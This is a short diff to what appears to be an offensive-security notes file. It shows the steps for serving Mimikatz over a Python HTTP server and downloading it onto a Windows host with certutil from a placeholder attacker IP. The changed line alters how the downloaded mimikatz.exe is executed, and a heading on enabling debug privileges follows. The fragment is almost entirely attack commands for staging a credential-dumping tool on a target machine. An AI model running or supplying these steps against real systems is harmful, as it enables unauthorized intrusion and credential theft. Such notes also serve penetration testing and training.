@@ -22,7 +22,7 @@ python3 -m http.server 8000
 # Windows machine
 certutil -urlcache -f http://<attacker-ip>:<port>/mimikatz.exe mimikatz.exe
 # Execute
-start C:\Windows\Temp\mimikatz.exe
+mimikatz.exe
 ```
 
 ## **Enable Debug Privileges**
